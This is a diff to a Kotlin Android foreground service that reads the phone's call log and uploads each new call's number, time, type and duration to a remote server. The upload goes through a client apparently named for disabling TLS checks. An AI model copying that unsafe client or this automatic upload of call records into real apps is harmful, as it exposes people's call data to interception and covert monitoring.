@@ -21,6 +21,7 @@ import okhttp3.RequestBody
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 import java.time.Instant
+import com.google.gson.annotations.SerializedName
 
 class SmsCallMonitorService : Service() {
     private var observerThread: HandlerThread? = null
@@ -63,15 +64,15 @@ class SmsCallMonitorService : Service() {
         startForeground(1001, notification)
     }
 
-    private fun sendCallEventFromLog(number: String?, date: Long) {
-        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=$number date=$date")
+    private fun sendCallEventFromLog(dto: CallDto) {
+        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=${dto.number} date=${dto.date} type=${dto.type} duration=${dto.duration}")
         val retrofit = Retrofit.Builder()
             .baseUrl(HttpClient.BASE_URL)
             .addConverterFactory(GsonConverterFactory.create())
             .client(HttpClient.getUnsafeOkHttpClient())
             .build()
         val api = retrofit.create(Api::class.java)
-        val payload = listOf(CallDto(number = number, date = date))
+        val payload = listOf(dto)
         val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
         api.send(body).enqueue(object : retrofit2.Callback<Void> {
             override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
@@ -83,11 +84,9 @@ class SmsCallMonitorService : Service() {
         })
     }
 
-    
-
     private fun processLatestCall() {
         val uri = CallLog.Calls.CONTENT_URI
-        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE)
+        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE, CallLog.Calls.DURATION)
         val sortOrder = CallLog.Calls.DATE + " DESC"
         var cursor: Cursor? = null
         try {
@@ -96,9 +95,23 @@ class SmsCallMonitorService : Service() {
                 val id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID))
                 val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                 val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
+                val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
+                val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
+                val durationVal = if (durationIdx != -1) cursor.getInt(durationIdx) else null
                 if (id != lastSentId) {
                     lastSentId = id
-                    sendCallEventFromLog(number, date)
+                    val typeStr = when (typeInt) {
+                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
+                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
+                        CallLog.Calls.MISSED_TYPE -> "MISSED"
+                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
+                        CallLog.Calls.VOICEMAIL_TYPE -> "VOICEMAIL"
+                        CallLog.Calls.BLOCKED_TYPE -> "BLOCKED"
+                        CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "ANSWERED_EXTERNALLY"
+                        else -> "UNKNOWN"
+                    }
+                    val dateIso = Instant.ofEpochMilli(date).toString()
+                    sendCallEventFromLog(CallDto(number = number, date = dateIso, type = typeStr, duration = durationVal))
                 }
             }
         } catch (e: SecurityException) {
@@ -121,7 +134,12 @@ class SmsCallMonitorService : Service() {
         fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
     }
 
-    data class CallDto(val number: String?, val date: Long)
+    data class CallDto(
+        @SerializedName("Number") val number: String?,
+        @SerializedName("Date") val date: String,
+        @SerializedName("Type") val type: String,
+        @SerializedName("Duration") val duration: Int?
+    )
 
     companion object {
         fun start(context: Context) {
